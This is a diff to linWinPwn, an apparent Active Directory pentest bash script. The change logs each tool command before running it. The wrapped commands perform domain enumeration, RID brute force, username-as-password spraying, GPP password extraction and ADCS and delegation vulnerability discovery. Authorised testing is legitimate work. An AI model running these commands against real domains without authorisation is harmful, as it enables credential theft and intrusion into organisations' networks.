@@ -69,7 +69,7 @@ pre2k=$(which pre2k)
 certsync=$(which certsync)
 hekatomb=$(which hekatomb)
 manspider=$(which manspider)
-coercer=$(which Coercer)
+coercer=$(which coercer)
 donpapi="$scripts_dir/DonPAPI-main/DonPAPI.py"
 kerbrute="$scripts_dir/kerbrute"
 silenthound="$scripts_dir/silenthound.py"
@@ -202,6 +202,7 @@ prepare (){
 
     if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
     output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
+    command_log="$output_dir/$(date +%Y-%m-%d)_command.log"
     servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
     dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
     sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
@@ -371,7 +372,9 @@ prepare (){
             cd ${output_dir}/Credentials
             echo -e ""
             echo -e "${YELLOW}[i]${NC} Requesting TGT for current user..."
-            ${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip} | grep -v "Impacket" | sed '/^$/d'
+            command="${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | grep -v "Impacket" | sed '/^$/d'
             cd ${current_dir}
             krb5cc="${output_dir}/Credentials/${user}.ccache"
         fi
@@ -470,7 +473,9 @@ dns_enum () {
             else
                 if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-                ${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip} | tee ${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt
+                command="${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt
                 mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
                 /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
                 /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
@@ -501,7 +506,9 @@ smb_scan () {
             echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
             servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
             if [ ! -f "${servers_smb_list}" ]; then
-                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt 1>/dev/null 2>&1
+                command="${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt 1>/dev/null"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1
                 grep -a "open" ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
             else
                 echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
@@ -511,7 +518,9 @@ smb_scan () {
             echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
             servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
             if [ "${custom_target_scanned}" == false ]; then
-                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
+                command="${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1
                 grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                 custom_target_scanned=true
             else
@@ -522,7 +531,9 @@ smb_scan () {
             echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
             servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
             if [ "${custom_target_scanned}" == false ]; then
-                ${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
+                command="${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1
                 grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                 custom_target_scanned=true
             else
@@ -546,7 +557,9 @@ bhd_enum () {
             else
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/BloodHound
-                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt
+                command="${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt
                 cd ${current_dir}
                 #${crackmapexec} ${cme_verbose} ldap ${cme_kerb} ${target} "${argument_cme[@]}" --bloodhound -ns ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/cme_bloodhound_output_${dc_domain}.txt 2>&1
             fi
@@ -568,7 +581,9 @@ bhd_enum_dconly () {
             else 
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/BloodHound
-                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt
+                command="${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt
                 cd ${current_dir}
                 #${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" --bloodhound -ns ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/cme_bloodhound_output_${dc_domain}.txt 2>&1
             fi
@@ -586,13 +601,17 @@ ldapdomaindump_enum () {
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ] ; then
-                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
+                command="${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos authentication ${NC}"
             else
                 if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos authentication. Trying to use NTLM instead${NC}"; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
-                ${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
+                command="${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             fi
         #Parsing user and computer lists
         /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldd_${dc_domain}.txt 2>&1
@@ -611,18 +630,24 @@ enum4linux_enum () {
             echo -e "${PURPLE}[-] enum4linux does not support kerberos authentication using AES Key${NC}"
         elif [ "${nullsess_bool}" == true ] ; then
             echo -e "${CYAN}[*] Empty username/password${NC}"
-            ${enum4linux_py} -A ${target} 2>&1 > ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt
+            command="${enum4linux_py} -A ${target}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 > ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>&1
             echo -e "............................(truncated output)"
             #Parsing user lists
             /bin/cat ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_nullsess_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] Guest with empty password${NC}"
-            ${enum4linux_py} -A ${target} -u 'Guest' -p '' > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
+            command="${enum4linux_py} -A ${target} -u 'Guest' -p ''"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
             echo -e "............................(truncated output)"            #Parsing user lists
             /bin/cat ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_guest_${dc_domain}.txt 2>&1
         else
-            ${enum4linux_py} -A ${argument_enum4linux} ${target} > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
+            command="${enum4linux_py} -A ${argument_enum4linux} ${target}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
             echo -e "............................(truncated output)"            #Parsing user lists
             /bin/cat ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_${dc_domain}.txt 2>&1
@@ -634,14 +659,18 @@ enum4linux_enum () {
 cme_smb_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
-        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} smb ${target} ${argument_cme[@]} --users"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep -a "${dc_domain}" | grep -a -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_smb_nullsess_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_smb_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users Enumeration (RPC authenticated)${NC}"
-        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_auth_smb_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} smb ${target} ${argument_cme[@]} --users"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command > ${output_dir}/DomainRecon/cme_users_auth_smb_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_auth_smb_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2};?)?)?[mGK]//g" | sed  -e 's/ \{2,\}/ /g' | cut -d " " -f 5 | cut -d "\\" -f 2 > ${output_dir}/DomainRecon/users_list_cme_smb_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_smb_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
@@ -649,10 +678,14 @@ cme_smb_enum () {
     fi
     echo -e ""
     echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
-    ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --pass-pol --log ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${target} ${argument_cme[@]} --pass-pol --log ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] GPP Enumeration${NC}"
-    ${crackmapexec} ${cme_verbose} smb ${target_dc} "${argument_cme[@]}" -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${target_dc} ${argument_cme[@]} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -660,14 +693,18 @@ cme_ldap_enum () {
     if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
-        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --users --kdcHost "${kdc}.${dc_domain}" > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} --users --kdcHost ${kdc}.${dc_domain}"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt 2>/dev/null | grep -a "${dc_domain}" | grep -a -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_ldap_nullsess_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_ldap_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
-        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --users --kdcHost "${kdc}.${dc_domain}" > ${output_dir}/DomainRecon/cme_users_auth_ldap_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} --users --kdcHost ${kdc}.${dc_domain}"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command > ${output_dir}/DomainRecon/cme_users_auth_ldap_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_auth_ldap_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2};?)?)?[mGK]//g" | sed  -e 's/ \{2,\}/ /g' | cut -d " " -f 5 > ${output_dir}/DomainRecon/users_list_cme_ldap_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_ldap_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
@@ -675,36 +712,52 @@ cme_ldap_enum () {
     fi
     echo -e ""
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --password-not-required --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} --password-not-required --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] ADCS Enumeration${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M adcs --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} -M adcs --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M get-desc-users --kdcHost "${kdc}.${dc_domain}" 2>&1 > ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M get-desc-users --kdcHost ${kdc}.${dc_domain}"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1 > ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt
     /bin/cat ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass\|pwd" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt 2>&1
     if [ ! -s ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
     fi
     echo -e ""
     echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M MAQ --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M MAQ --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Subnets Enumeration${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M subnets --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/cme_subnets_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M subnets --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/cme_subnets_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] LDAP-signing check${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-checker --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target_dc} ${argument_cme[@]} ${ldaps_param} -M ldap-checker --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} --trusted-for-delegation --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target_dc} ${argument_cme[@]} ${ldaps_param} --trusted-for-delegation --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
 ridbrute_attack () {
     echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --rid-brute 2>&1 > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} smb ${target} ${argument_cme[@]} --rid-brute"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
@@ -723,7 +776,9 @@ userpass_cme_check () {
          echo -e "${PURPLE}[-] No users found! Please run users enumeration and try again..${NC}"
     else
         echo -e "${YELLOW}[i] Finding users with Password = username using crackmapexec. This may take a while...${NC}"
-        ${crackmapexec} ${cme_verbose} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success 2>&1 > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1 > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt
         /bin/cat ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt"
         if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt" ] ; then
             echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
@@ -747,11 +802,15 @@ pre2k_check () {
             if [ ! -s "${known_computers_list}" ] ; then
                 echo -e "${PURPLE}[-] No computers found! Please run computers enumeration and try again..${NC}"
             else
-                ${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${known_computers_list} -outputfile ${pre2k_outputfile} | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
+                command="${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${known_computers_list} -outputfile ${pre2k_outputfile}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
             fi
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            ${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param} | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
+            command="${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -762,7 +821,9 @@ deleg_enum_imp () {
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
-        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} ${argument_ThePorgs} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+        command="${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} ${argument_ThePorgs}"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
@@ -778,9 +839,15 @@ certi_py_enum () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
         else
-            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
-            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
-            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
+            command="${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
+            command="${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
+            command="${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
         fi
     fi
     adcs_vuln_parse
@@ -801,8 +868,12 @@ certipy_enum () {
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/ADCS
                 if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout -hide-admins 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+                command="${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
+                command="${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout -hide-admins"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
                 cd ${current_dir}
             fi
         fi
@@ -813,7 +884,9 @@ certipy_enum () {
 
 adcs_vuln_parse (){
     if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
-        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M adcs --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+        command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command 2>&1
     fi
 
